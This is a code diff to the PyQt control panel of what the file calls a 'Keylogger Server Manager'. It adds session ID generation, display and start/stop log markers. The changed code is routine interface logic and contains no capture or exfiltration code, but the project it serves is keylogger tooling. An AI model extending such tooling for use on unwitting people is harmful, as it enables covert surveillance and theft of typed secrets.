@@ -1,5 +1,5 @@
 """
-Keylogger Server Manager - Main Interface
+Keylogger Server Manager - Main Interface with Session ID
 """
 
 import sys
@@ -33,6 +33,7 @@ class KeyloggerServerGUI(QWidget):
         self.server_running = False
         self.start_time = None
         self.last_log_size = 0
+        self.session_id = None  # Track current session ID
         
         # Load settings
         self.settings = self.load_settings_from_file()
@@ -91,7 +92,7 @@ class KeyloggerServerGUI(QWidget):
         header.addStretch()
         
         # Add settings button
-        settings_btn = QPushButton("Settings")
+        settings_btn = QPushButton("⚙ Settings")
         settings_btn.clicked.connect(self.open_settings)
         header.addWidget(settings_btn)
         
@@ -104,11 +105,12 @@ class KeyloggerServerGUI(QWidget):
         self.server_status_label = QLabel("Offline")
         self.uptime_label = QLabel("00:00:00")
         self.port_label = QLabel(f"Port: {self.settings['server_port']}")
+        self.session_id_label = QLabel("Session ID: —")
         
         card1 = QGroupBox("Main Server")
         v1 = QVBoxLayout()
         v1.addWidget(self.port_label)
-        v1.addWidget(QLabel("Session ID: —"))
+        v1.addWidget(self.session_id_label)
         v1.addWidget(QLabel("Uptime:"))
         v1.addWidget(self.uptime_label)
         v1.addWidget(self.server_status_label)
@@ -230,15 +232,23 @@ class KeyloggerServerGUI(QWidget):
     # ==================== BUTTON HANDLERS ====================
     
     def start_server(self):
-        process, success, error = utils.start_server(SERVER_SCRIPT)
+        # Generate new session ID
+        self.session_id = utils.generate_session_id()
+        
+        # Start server with session ID as environment variable
+        process, success, error = utils.start_server(SERVER_SCRIPT, self.session_id)
         
         if success:
             self.server_process = process
             self.server_running = True
             self.start_time = datetime.datetime.now()
             self.server_status_label.setText("Online")
+            self.session_id_label.setText(f"Session: {self.session_id}")  # Show full ID now
             self.start_btn.setEnabled(False)
             self.stop_btn.setEnabled(True)
+            
+            # Write session start to log
+            self.write_session_log(f"=== SERVER SESSION STARTED: {self.session_id} ===")
             
             # Setup auto-stop if enabled
             if self.settings["auto_stop_enabled"]:
@@ -248,6 +258,18 @@ class KeyloggerServerGUI(QWidget):
                 print(f"Auto-stop enabled: {self.settings['auto_stop_minutes']} minutes")
         else:
             QMessageBox.critical(self, "Error", f"Failed to start: {error}")
+
+    def write_session_log(self, message):
+        """Write session info to log file."""
+        log_file = self.settings["log_file_path"]
+        try:
+            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            with open(log_file, 'a', encoding='utf-8') as f:
+                f.write(f"\n{'='*60}\n")
+                f.write(f"[{timestamp}] {message}\n")
+                f.write(f"{'='*60}\n\n")
+        except Exception as e:
+            print(f"Error writing session log: {e}")
 
     def auto_stop_server(self):
         """Automatically stop server after timeout."""
@@ -265,11 +287,17 @@ class KeyloggerServerGUI(QWidget):
                 self.auto_stop_timer.stop()
                 self.auto_stop_timer = None
             
+            # Write session end to log
+            if self.session_id:
+                self.write_session_log(f"=== SERVER SESSION ENDED: {self.session_id} ===")
+            
             success, error = utils.stop_server(self.server_process)
             if success:
                 self.server_process = None
                 self.server_running = False
                 self.server_status_label.setText("Offline")
+                self.session_id_label.setText("Session ID: —")
+                self.session_id = None
                 self.start_btn.setEnabled(True)
                 self.stop_btn.setEnabled(False)
             else:
